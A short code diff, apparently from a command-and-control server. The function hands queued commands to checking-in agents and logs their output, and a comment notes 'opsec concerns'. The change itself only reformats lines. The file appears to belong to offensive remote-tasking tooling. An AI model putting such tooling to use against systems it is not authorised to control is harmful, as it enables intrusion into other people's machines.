@@ -25,13 +25,16 @@ def process_agent(data, dictionary):
                         print(x, y)
                         if x == dictionary[key]['id']:
                             if len(y) > 0:
-                                command_patch = patch.convert_command_to_patch(y)
+                                command_patch = patch.convert_command_to_patch(
+                                    y)
                                 del settings.command_queue_table[x]
                                 return command_patch
                     pass
                 else:
                     pass
-            elif str(identifier) == "output": # Note technically this can have some opsec concerns I should probably clean auth up 
+            elif str(
+                    identifier
+            ) == "output":  # Note technically this can have some opsec concerns I should probably clean auth up
                 print("Command output received: ", data)
 
         return "roger"
